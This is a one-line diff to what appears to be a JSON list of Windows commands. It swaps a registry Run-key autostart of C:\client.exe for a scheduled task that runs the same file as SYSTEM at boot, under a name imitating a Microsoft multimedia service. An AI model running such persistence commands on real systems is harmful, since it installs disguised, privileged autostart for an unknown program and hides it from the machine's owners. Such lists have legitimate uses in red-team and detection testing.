@@ -1,1 +1,1 @@
-["REG ADD \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v test1 /t REG_SZ /d \"C:\\client.exe\""]
+["schtasks /create /ru system /tn \"Microsoft\\Windows\\Multimedia\\SystemMediaService\" /sc ONSTART /tr \"C:\\client.exe\""]
